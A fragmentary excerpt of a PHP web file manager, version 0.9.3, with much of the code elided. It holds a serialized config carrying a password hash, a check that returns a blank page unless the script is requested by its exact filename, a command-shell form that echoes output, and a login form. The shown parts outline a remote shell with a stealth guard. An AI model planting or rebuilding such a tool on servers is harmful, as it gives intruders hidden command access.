<?php
//a:9:{s:4:"lang";s:2:"en";s:9:"auth_pass";s:32:"b664a0919d8e25cd0c83291adc829312";s:8:"quota_mb";i:0;s:17:"upload_ext_filter";a:0:{}s:19:"download_ext_filter";a:0:{}s:15:"error_reporting";s:0:"";s:7:"fm_root";s:0:"";s:17:"cookie_cache_time";i:1096733048;s:7:"version";s:5:"0.9.3";}
/*--------------------------------------------------
 | PHP FILE MANAGER
 +--------------------------------------------------
...
// +--------------------------------------------------
    ...
    $script_filename1 = $_SERVER["SCRIPT_FILENAME"];
    $ruri = $_SERVER["REQUEST_URI"]; 
    $ruri = preg_replace("#^/#", "", $ruri);
    $ruri = preg_replace("#\?.*$#", "", $ruri);
    $path_info = pathinfo($script_filename);
    $f0 = $script_filename;   $f0=preg_replace("#.+/#", "", $f0);
    $f1 = $script_filename1;  $f1=preg_replace("#.+/#", "", $f1);
    if(!preg_match("/.php$/",$script_filename) || $f0 != $f1 || $f0 != $ruri) die(" ");
// +--------------------------------------------------
// | Config
// +--------------------------------------------------
    $cfg = new config();
...
function dir_list_form() {
    ...
    if ($opdir = @opendir($dir_atual)) {
        ...
        foreach ($entry_list as $i=>$data){
            $out .= "entry_list['entry$i'] = new entry('".$data["name"]."', '".$data["type"]."', ".$data["size"].", false);";
        }
        $out .= "
    ...
    switch ($shell_form){
        ...
        case 2:
            ...
            if (strlen($data_out)) echo "
   	        ...
   	        "var e=parent.frame1.document.data_form.data_out; e.scrollTop=e.scrollHeight;";
            echo "
...
function form_login(){
    ...
    if ($auth_pass != md5("")){
        ...
        <table border=0 cellspacing=0 cellpadding=5>
            ...
            <tr>
            <td colspan=2><input type=submit value=\"".et('Send')."\"></td>
            </tr>
        ";
        if (strlen($erro)) echo "
            <tr>
            <td align=left><font color=red size=4>Invalid</font>
            </tr>
        ";
        echo "
            </form>
